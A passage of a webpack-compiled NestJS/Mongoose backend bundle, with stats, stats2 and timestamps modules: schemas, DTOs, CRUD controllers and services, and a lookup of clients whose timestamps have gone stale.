            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async deleteOne(chatId, profile) {
        const result = await this.statModel.deleteOne({ chatId, profile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
    }
    async deleteAll() {
        await this.statModel.deleteMany({}).exec();
    }
};
exports.StatService = StatService;
exports.StatService = StatService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)("StatsModule")),
    __metadata("design:paramtypes", [mongoose_2.Model])
], StatService);


/***/ }),

/***/ "./src/components/stats/update-stat.dto.ts":
/*!*************************************************!*\
  !*** ./src/components/stats/update-stat.dto.ts ***!
  \*************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_stat_dto_1 = __webpack_require__(/*! ./create-stat.dto */ "./src/components/stats/create-stat.dto.ts");
class UpdateStatDto extends (0, swagger_1.PartialType)(create_stat_dto_1.CreateStatDto) {
}
exports.UpdateStatDto = UpdateStatDto;


/***/ }),

/***/ "./src/components/stats2/create-stat2.dto.ts":
/*!***************************************************!*\
  !*** ./src/components/stats2/create-stat2.dto.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateStatDto {
}
exports.CreateStatDto = CreateStatDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "profile", void 0);


/***/ }),

/***/ "./src/components/stats2/index.ts":
/*!****************************************!*\
  !*** ./src/components/stats2/index.ts ***!
  \****************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Stat2UpdateDto = exports.Stat2Schema = exports.Stat2 = exports.Stat2Service = exports.Stat2Module = exports.Stat2Controller = exports.Stat2CreateDto = void 0;
var create_stat2_dto_1 = __webpack_require__(/*! ./create-stat2.dto */ "./src/components/stats2/create-stat2.dto.ts");
Object.defineProperty(exports, "Stat2CreateDto", ({ enumerable: true, get: function () { return create_stat2_dto_1.CreateStatDto; } }));
var stat2_controller_1 = __webpack_require__(/*! ./stat2.controller */ "./src/components/stats2/stat2.controller.ts");
Object.defineProperty(exports, "Stat2Controller", ({ enumerable: true, get: function () { return stat2_controller_1.Stat2Controller; } }));
var stat2_module_1 = __webpack_require__(/*! ./stat2.module */ "./src/components/stats2/stat2.module.ts");
Object.defineProperty(exports, "Stat2Module", ({ enumerable: true, get: function () { return stat2_module_1.Stat2Module; } }));
var stat2_service_1 = __webpack_require__(/*! ./stat2.service */ "./src/components/stats2/stat2.service.ts");
Object.defineProperty(exports, "Stat2Service", ({ enumerable: true, get: function () { return stat2_service_1.Stat2Service; } }));
var stat2_schema_1 = __webpack_require__(/*! ./stat2.schema */ "./src/components/stats2/stat2.schema.ts");
Object.defineProperty(exports, "Stat2", ({ enumerable: true, get: function () { return stat2_schema_1.Stat2; } }));
Object.defineProperty(exports, "Stat2Schema", ({ enumerable: true, get: function () { return stat2_schema_1.StatSchema; } }));
var update_stat2_dto_1 = __webpack_require__(/*! ./update-stat2.dto */ "./src/components/stats2/update-stat2.dto.ts");
Object.defineProperty(exports, "Stat2UpdateDto", ({ enumerable: true, get: function () { return update_stat2_dto_1.UpdateStatDto; } }));


/***/ }),

/***/ "./src/components/stats2/stat2.controller.ts":
/*!***************************************************!*\
  !*** ./src/components/stats2/stat2.controller.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Stat2Controller = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const stat2_service_1 = __webpack_require__(/*! ./stat2.service */ "./src/components/stats2/stat2.service.ts");
const create_stat2_dto_1 = __webpack_require__(/*! ./create-stat2.dto */ "./src/components/stats2/create-stat2.dto.ts");
const update_stat2_dto_1 = __webpack_require__(/*! ./update-stat2.dto */ "./src/components/stats2/update-stat2.dto.ts");
let Stat2Controller = class Stat2Controller {
    constructor(statService) {
        this.statService = statService;
    }
    async create(createStatDto) {
        return this.statService.create(createStatDto);
    }
    async findByChatIdAndProfile(chatId, profile) {
        return this.statService.findByChatIdAndProfile(chatId, profile);
    }
    async update(chatId, profile, updateStatDto) {
        return this.statService.update(chatId, profile, updateStatDto);
    }
    async deleteOne(chatId, profile) {
        return this.statService.deleteOne(chatId, profile);
    }
    async deleteAll() {
        return this.statService.deleteAll();
    }
};
exports.Stat2Controller = Stat2Controller;
__decorate([
    (0, common_1.Post)(),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_stat2_dto_1.CreateStatDto]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "findByChatIdAndProfile", null);
__decorate([
    (0, common_1.Put)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, update_stat2_dto_1.UpdateStatDto]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "deleteOne", null);
__decorate([
    (0, common_1.Delete)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "deleteAll", null);
exports.Stat2Controller = Stat2Controller = __decorate([
    (0, swagger_1.ApiTags)('stats2'),
    (0, common_1.Controller)('stats2'),
    __metadata("design:paramtypes", [stat2_service_1.Stat2Service])
], Stat2Controller);


/***/ }),

/***/ "./src/components/stats2/stat2.module.ts":
/*!***********************************************!*\
  !*** ./src/components/stats2/stat2.module.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Stat2Module = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const stat2_service_1 = __webpack_require__(/*! ./stat2.service */ "./src/components/stats2/stat2.service.ts");
const stat2_controller_1 = __webpack_require__(/*! ./stat2.controller */ "./src/components/stats2/stat2.controller.ts");
const stat2_schema_1 = __webpack_require__(/*! ./stat2.schema */ "./src/components/stats2/stat2.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let Stat2Module = class Stat2Module {
};
exports.Stat2Module = Stat2Module;
exports.Stat2Module = Stat2Module = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: "Stats2Module", collection: "stats2", schema: stat2_schema_1.StatSchema }])
        ],
        controllers: [stat2_controller_1.Stat2Controller],
        providers: [stat2_service_1.Stat2Service],
        exports: [stat2_service_1.Stat2Service]
    })
], Stat2Module);


/***/ }),

/***/ "./src/components/stats2/stat2.schema.ts":
/*!***********************************************!*\
  !*** ./src/components/stats2/stat2.schema.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatSchema = exports.Stat2 = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let Stat2 = class Stat2 {
};
exports.Stat2 = Stat2;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat2.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat2.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "profile", void 0);
exports.Stat2 = Stat2 = __decorate([
    (0, mongoose_1.Schema)()
], Stat2);
exports.StatSchema = mongoose_1.SchemaFactory.createForClass(Stat2);
exports.StatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });


/***/ }),

/***/ "./src/components/stats2/stat2.service.ts":
/*!************************************************!*\
  !*** ./src/components/stats2/stat2.service.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Stat2Service = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let Stat2Service = class Stat2Service {
    constructor(statModel) {
        this.statModel = statModel;
    }
    async create(createStatDto) {
        const createdStat = new this.statModel(createStatDto);
        return createdStat.save();
    }
    async findByChatIdAndProfile(chatId, profile) {
        const stat = await this.statModel.findOne({ chatId, profile }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async update(chatId, profile, updateStatDto) {
        const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async findAll() {
        const stats = await this.statModel.find().exec();
        return stats;
    }
    async deleteOne(chatId, profile) {
        const result = await this.statModel.deleteOne({ chatId, profile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
    }
    async deleteAll() {
        await this.statModel.deleteMany({}).exec();
    }
};
exports.Stat2Service = Stat2Service;
exports.Stat2Service = Stat2Service = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)("Stats2Module")),
    __metadata("design:paramtypes", [mongoose_2.Model])
], Stat2Service);


/***/ }),

/***/ "./src/components/stats2/update-stat2.dto.ts":
/*!***************************************************!*\
  !*** ./src/components/stats2/update-stat2.dto.ts ***!
  \***************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_stat2_dto_1 = __webpack_require__(/*! ./create-stat2.dto */ "./src/components/stats2/create-stat2.dto.ts");
class UpdateStatDto extends (0, swagger_1.PartialType)(create_stat2_dto_1.CreateStatDto) {
}
exports.UpdateStatDto = UpdateStatDto;


/***/ }),

/***/ "./src/components/timestamps/index.ts":
/*!********************************************!*\
  !*** ./src/components/timestamps/index.ts ***!
  \********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./timestamp.controller */ "./src/components/timestamps/timestamp.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./timestamp.module */ "./src/components/timestamps/timestamp.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./timestamp.service */ "./src/components/timestamps/timestamp.service.ts"), exports);


/***/ }),

/***/ "./src/components/timestamps/timestamp.controller.ts":
/*!***********************************************************!*\
  !*** ./src/components/timestamps/timestamp.controller.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TimestampController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const timestamp_service_1 = __webpack_require__(/*! ./timestamp.service */ "./src/components/timestamps/timestamp.service.ts");
let TimestampController = class TimestampController {
    constructor(timestampService) {
        this.timestampService = timestampService;
    }
    async findOne() {
        return this.timestampService.findOne();
    }
    async getClientsWithTimeDifference(thresholdMinutes) {
        const threshold = thresholdMinutes ? thresholdMinutes * 60 * 1000 : 3 * 60 * 1000;
        return this.timestampService.getClientsWithTimeDifference(threshold);
    }
    async update(updateTimestampDto) {
        return this.timestampService.update(updateTimestampDto);
    }
};
exports.TimestampController = TimestampController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get timestamp data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], TimestampController.prototype, "findOne", null);
__decorate([
    (0, common_1.Get)('stalled'),
    (0, swagger_1.ApiOperation)({ summary: 'Get clients with time differences greater than threshold' }),
    (0, swagger_1.ApiQuery)({
        name: 'threshold',
        type: Number,
        required: false,
        description: 'Minimum time difference in minutes (default: 3)'
    }),
    __param(0, (0, common_1.Query)('threshold')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number]),
    __metadata("design:returntype", Promise)
], TimestampController.prototype, "getClientsWithTimeDifference", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update timestamp data' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], TimestampController.prototype, "update", null);
exports.TimestampController = TimestampController = __decorate([
    (0, swagger_1.ApiTags)('Timestamps'),
    (0, common_1.Controller)('timestamps'),
    __metadata("design:paramtypes", [timestamp_service_1.TimestampService])
], TimestampController);


/***/ }),

/***/ "./src/components/timestamps/timestamp.module.ts":
/*!*******************************************************!*\
  !*** ./src/components/timestamps/timestamp.module.ts ***!
  \*******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TimestampModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const timestamp_service_1 = __webpack_require__(/*! ./timestamp.service */ "./src/components/timestamps/timestamp.service.ts");
const timestamp_controller_1 = __webpack_require__(/*! ./timestamp.controller */ "./src/components/timestamps/timestamp.controller.ts");
const timestamps_schema_1 = __webpack_require__(/*! ./timestamps.schema */ "./src/components/timestamps/timestamps.schema.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let TimestampModule = class TimestampModule {
};
exports.TimestampModule = TimestampModule;
exports.TimestampModule = TimestampModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{
                    name: 'timestampModule',
                    collection: 'timestamps',
                    schema: timestamps_schema_1.TimestampSchema
                }]),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
        ],
        providers: [timestamp_service_1.TimestampService],
        controllers: [timestamp_controller_1.TimestampController],
        exports: [timestamp_service_1.TimestampService],
    })
], TimestampModule);


/***/ }),

/***/ "./src/components/timestamps/timestamp.service.ts":
/*!********************************************************!*\
  !*** ./src/components/timestamps/timestamp.service.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TimestampService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
let TimestampService = class TimestampService {
    constructor(timestampModel, clientService) {
        this.timestampModel = timestampModel;
        this.clientService = clientService;
    }
    async findOne() {
        const timestamp = await this.timestampModel.findOne({}).lean().exec();
        if (!timestamp) {
            throw new common_1.NotFoundException(`Timestamp not found`);
        }
        if (timestamp._id) {
            delete timestamp._id;
        }
        return timestamp;
    }
    async getTimeDifferences(threshold = 3 * 60 * 1000) {
        const timestamp = await this.timestampModel.findOne({}).lean().exec();
        if (!timestamp) {
            throw new common_1.NotFoundException(`Timestamp not found`);
        }
        const currentTime = Date.now();
        const differences = {};
        Object.keys(timestamp).forEach(key => {
            if (key === '_id' || typeof timestamp[key] !== 'number') {
                return;
            }
            const difference = currentTime - timestamp[key];
            if (difference > threshold) {
                differences[key] = difference;
            }
        });
        return differences;
    }
    async getClientsWithTimeDifference(threshold = 3 * 60 * 1000) {
        const differences = await this.getTimeDifferences(threshold);
        const clientIds = Object.keys(differences);
        if (clientIds.length === 0) {
            return [];
        }
        const urls = [];
        for (const clientId of clientIds) {
            const clientParams = clientId.split('_');
            try {
                const client = await this.clientService.findOne(clientParams[0], false);
                if (client) {
                    if (clientParams[1]) {
                        urls.push(client.promoteRepl);
                    }
                    else {
                        urls.push(client.repl);
                    }
                }
            }
            catch (error) {
                console.error(`Error fetching client with ID ${clientId}:`, error.message);
            }
        }
        return urls;
    }
    async update(updateTimestampDto) {
        delete updateTimestampDto['_id'];
        const updatedTimestamp = await this.timestampModel.findOneAndUpdate({}, { $set: { ...updateTimestampDto } }, { new: true, upsert: true, lean: true }).exec();
        if (!updatedTimestamp) {
            throw new common_1.NotFoundException(`Timestamp not found`);
        }
        if (updatedTimestamp._id) {
            delete updatedTimestamp._id;
        }
        return updatedTimestamp;
    }
    async clear() {
        const timestamp = await this.timestampModel.findOne({}).lean().exec();
        if (!timestamp) {
            const created = await this.timestampModel.create({});
            const createdObj = created.toObject ? created.toObject() : { ...created };
            if (createdObj._id) {
                delete createdObj._id;
            }
            return createdObj;
        }
        const keys = Object.keys(timestamp).filter(k => k !== '_id');
        if (keys.length === 0) {
            const copy = { ...timestamp };
            if (copy._id)
                delete copy._id;
            return copy;
        }
        const unsetObj = {};
        for (const k of keys) {
            unsetObj[k] = "";
        }
        await this.timestampModel.updateOne({}, { $unset: unsetObj }).exec();
        const updated = await this.timestampModel.findOne({}).lean().exec();
        if (updated && updated._id)
            delete updated._id;
        return updated || {};
    }
};
exports.TimestampService = TimestampService;
exports.TimestampService = TimestampService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('timestampModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        client_service_1.ClientService])
], TimestampService);


/***/ }),

/***/ "./src/components/timestamps/timestamps.schema.ts":
/*!********************************************************!*\
  !*** ./src/components/timestamps/timestamps.schema.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
